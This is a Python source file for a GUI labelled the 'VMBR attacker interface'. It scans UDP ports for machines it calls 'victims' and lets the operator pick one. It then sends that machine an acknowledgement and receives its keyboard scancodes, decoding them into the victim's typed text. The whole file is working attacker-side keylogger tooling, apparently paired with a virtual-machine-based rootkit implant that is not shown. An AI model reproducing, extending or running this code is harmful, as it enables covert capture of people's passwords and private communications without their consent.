import socket
import customtkinter as ctk
import threading
import queue
import time

codes = ("", "ESC", '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 
         '-', '=', "BKSP", "\t", 'q', 'w', 'e', 'r', 't', 'y', 
         'u', 'i', 'o', 'p', '[', ']', "\n", "CTRL", 'a', 's', 
         'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', "LSHIFT", 
         '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 
         "RSHIFT", "PRTSCR", "ALT", ' ', "CAPSLOCK", "F1", "F2", 
         "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", 
         "SCRLOCK", "HOME", "UP", "PGUP", '-', "LEFT", '5', "RIGHT", 
         '+', "END", "DOWN", "PGDN", "INSERT", "DELETE", "SH_F1",
         "SH_F2", "SH_F3", "SH_F4", "SH_F5", "SH_F6", "SH_F7", "SH_F8",
         "SH_F9", "SH_F10", "CTRL_F1", "CTRL_F2", "CTRL_F3", "CTRL_F4",
         "CTRL_F5", "CTRL_F6", "CTRL_F7", "CTRL_F8", "CTRL_F9",
         "CTRL_F10", "ALT_F1", "ALT_F2", "ALT_F3", "ALT_F4", "ALT_F5",
         "ALT_F6", "ALT_F7", "ALT_F8", "ALT_F9", "ALT_F10", "CTRL_PRTSCR",
         "CTRL_LEFT", "CTRL_RIGHT", "CTRL_END", "CTRL_PGDN", "ALT1",
         "ALT2", "ALT3", "ALT4", "ALT5", "ALT6", "ALT7", "ALT8", "ALT9",
         "ALT0", "ALT-", "ALT=", "CTRL_PGUP", "F11", "F12", "SH_F11",
         "SH_F12", "CTRL_F11", "CTRL_F12", "ALT_F11", "ALT_F12", "CTRL_UP",
         "CTRL-", "CTRL5", "CTRL+", "CTRL_DOWN", "CTRL_INSERT", 
         "CTRL_DELETE", "CTRL_TAB", "CTRL/", "CTRL*", "ALT_HOME", "ALT_UP",
         "ALT_PGUP", "", "ALT_LEFT", "", "ALT_RIGHT", "", "ALT_END",
         "ALT_DOWN", "ALT_PGDN", "ALT_INSERT", "ALT_DELETE", "ALT/",
         "ALT_TAB", "ALT_ENTER")

SCAN_PORT = 49323
KEYLOGS_PORT = 49324

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind(('', SCAN_PORT))

shift_on = False
caps_on = False
ctrl_on = False
alt_on = False

def decode_scancodes(string):

    global shift_on
    global caps_on
    global ctrl_on
    global alt_on
    shift_dict = {'1': '!', '2': '@', '3': '#', '4': '$', '5': '%', 
                  '6': '^', '7': '&', '8': '*', '9': '(', '0': ')', 
                  '-': '_', '=': '+', '`': '~', ',': '<', '.': '>', 
                  '/': '?', ';': ':', '\'': '"', '[': '{', ']': '}', 
                  '\\': '|'}

    out = ""
    for i in string:
        if i & 0x80:        # released
            print(f'released {codes[int(i & (~0x80))]}')
            i &= ~0x80
            if codes[int(i)] == "CTRL":
                ctrl_on = False
            elif codes[int(i)] in ("LSHIFT", "RSHIFT"):
                shift_on = False
            elif codes[int(i)] == "ALT":
                alt_on = False
        else:               # pressed
            print(f'pressed {codes[int(i)]}')
            if codes[int(i)] == "CTRL":
                ctrl_on = True
            elif codes[int(i)] in ("LSHIFT", "RSHIFT"):
                shift_on = True
            elif codes[int(i)] == "ALT":
                alt_on = True
            elif codes[int(i)] == "CAPSLOCK":
                caps_on = not caps_on
            else:
                if (shift_on or caps_on) and 'a' <= codes[int(i)] <= 'z':
                    out += codes[int(i)].upper()
                elif shift_on and codes[int(i)] in shift_dict.keys():
                    out += shift_dict[codes[int(i)]]
                # elif shift_on:
                #     out += "SHIFT+"+codes[int(i)]
                elif alt_on:
                    out += "ALT+"+codes[int(i)]
                elif ctrl_on:
                    out += "CTRL+"+codes[int(i)]
                else:
                    out += codes[int(i)]
    return out

class EntryFrame(ctk.CTkFrame):
    def __init__(self, app, **kwargs):
        super().__init__(app, **kwargs)

        self.app = app

        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=3)
        self.grid_rowconfigure(1, weight=1)
        self.grid_rowconfigure(2, weight=5)

        self.label = ctk.CTkLabel(self, text="HELLO", font=("Arial", 40, "bold"))
        self.label.grid(row=0, column=0, padx=0, pady=0, sticky="s")

        self.label = ctk.CTkLabel(self, text="Welcome to the VMBR attacker interface", font=("Arial", 16))
        self.label.grid(row=1, column=0, padx=0, pady=5, sticky="n")

        self.button = ctk.CTkButton(self, text="Start", command=self.button_callback, font=("Arial", 20))
        self.button.grid(row=2, column=0, padx=0, pady=0)
    
    def button_callback(self):
        self.app.start()

class ScanningMachinesFrame(ctk.CTkFrame):
    def __init__(self, app, **kwargs):
        super().__init__(app, **kwargs)

        self.app = app

        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)

        self.label = ctk.CTkLabel(self, text="Scanning for active VMs...", font=("Arial", 20))
        self.label.grid(row=0, column=0, padx=0, pady=0, sticky="s")
        
        self.bar = ctk.CTkProgressBar(self, mode="determinate", determinate_speed=0.1)
        self.bar.grid(row=1, column=0, padx=0, pady=0, sticky="n")
        self.bar.set(0)
        self.bar.start()

        self.thread = threading.Thread(target=self.start)

    
    def start(self):

        self.incoming_queue = queue.Queue()
        self.stop_scanning = False
        listening_thread = threading.Thread(target=self.scan_incoming_victims, name='victims-scanning-thread')
        listening_thread.start()
        
        time.sleep(3)
        
        self.stop_scanning = True
        self.bar.stop()
        self.bar.set(1)

        while listening_thread.is_alive():
            pass
        
        self.app.start_choosing_window(self.incoming_queue)

    def scan_incoming_victims(self):
        sock.settimeout(1)
        while not self.stop_scanning:
            try:
                message, address = sock.recvfrom(256)
            except TimeoutError:
                continue
            self.incoming_queue.put((message, address))

class ChooseFrame(ctk.CTkFrame):
    def __init__(self, app: ctk.CTk, victims: queue.Queue, **kwargs):
        super().__init__(app, **kwargs)

        self.app = app

        self.choosing_victim_frame = ChoosingVictimFrame(self, victims)
        self.choosing_victim_frame.grid(row=1, column=0, padx=0, pady=0, sticky="nswe")
        self.label = ctk.CTkLabel(self, text="Choose a victim", font=("Arial", 30))
        self.label.grid(row=0, column=0, padx=0, pady=5, sticky="")
        self.grid_rowconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=4)
        self.grid_columnconfigure(0, weight=1)


class ChoosingVictimFrame(ctk.CTkScrollableFrame):
    def __init__(self, app: ctk.CTk, victims: queue.Queue, **kwargs):
        super().__init__(app, **kwargs)

        self.app = app

        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure(0, weight=1)
        self.grid_columnconfigure(1, weight=1)
        self.grid_columnconfigure(2, weight=1)
        self.grid_columnconfigure(3, weight=1)

        victim_frames = []
        victim_addresses = []
        while not victims.empty():
            if victims.queue[0][1] in victim_addresses:
                victims.get()
                continue
            victim_addresses.append(victims.queue[0][1])
            victim_frames.append(VictimFrame(self, victims.get()))
        
        for i, victim in enumerate(victim_frames):
            self.grid_rowconfigure(i//4, weight=1)
            victim.grid(row=i//4, column=i%4, padx=5, pady=5)
        
        


class VictimFrame(ctk.CTkFrame):
    def __init__(self, app: ctk.CTk, victim, **kwargs):

        super().__init__(app, **kwargs)

        self.app = app
        self.victim = victim

        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)

        self.label = ctk.CTkLabel(self, text=f"IP: {victim[1][0]}\nPort: {victim[1][1]}")
        self.label.grid(row=0, column=0, padx=0, pady=0)

        self.button = ctk.CTkButton(self, text="Choose", font=("Arial", 16), command=self.chosen)
        self.button.grid(row=1, column=0, padx=0, pady=0)
    
    def chosen(self):
        self.app.app.app.start_keylogging(self.victim)


class KeyloggerFrame(ctk.CTkFrame):
    def __init__(self, app: ctk.CTk, victim, **kwargs):

        super().__init__(app, **kwargs)

        self.app = app
        self.victim = victim
        
        self.grid_rowconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=4)
        self.grid_columnconfigure(0, weight=1)

        self.label = ctk.CTkLabel(self, text="Keylogger", font=("Arial", 30))
        self.label.grid(row=0, column=0, padx=0, pady=5, sticky="")
        self.textbox = ctk.CTkTextbox(self, font=("Arial", 16))
        self.textbox.grid(row=1, column=0, sticky="nsew")
        
        self.textbox.configure(state="disabled")

        self.thread = threading.Thread(target=self.start)


    def start(self):
        global sock
        sock.sendto(b"OKAY", self.victim[1])
        sock.close()
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(('', KEYLOGS_PORT))
        while True:
            data, address = sock.recvfrom(256)
            if (address != self.victim[1]):
                continue
            logs = decode_scancodes(data[1:])
            # print(f"\033[38;5;172mReceived: \033[38;5;223m{logs}\033[0m")

            self.textbox.configure(state="normal")
            self.textbox.insert("end", logs)
            self.textbox.configure(state="disabled")



class App(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("VMBR")
        self.geometry("600x400")
        
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.entry_frame = EntryFrame(self, fg_color="transparent")
        self.entry_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
    
    def start(self):
        self.entry_frame.destroy()
        self.scan_frame = ScanningMachinesFrame(self, fg_color="transparent")
        self.scan_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
        self.scan_frame.thread.start()
    
    def start_choosing_window(self, victims: queue.Queue):
        self.scan_frame.destroy()
        self.choose_frame = ChooseFrame(self, victims, fg_color="transparent")
        self.choose_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
    
    def start_keylogging(self, victim):
        self.choose_frame.destroy()
        self.keylogger_frame = KeyloggerFrame(self, victim)
        self.keylogger_frame.grid(row=0, column=0, padx=0, pady=0, sticky="nswe")
        self.keylogger_frame.thread.start()


def main():

    ctk.set_appearance_mode("dark")
    app = App()
    app.mainloop()


    return
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind(('', 49324))

    print("\033[38;5;208mAttacker started. \033[3mWaiting for packets from victim...\033[0m")

    while True:
        message, address = server_socket.recvfrom(256)

        len = int(message[0])
        logs = decode_scancodes(message[1:])
        print(f"\033[38;5;172mReceived: \033[38;5;223m{logs}\033[0m")
    

if __name__ == '__main__':
    main()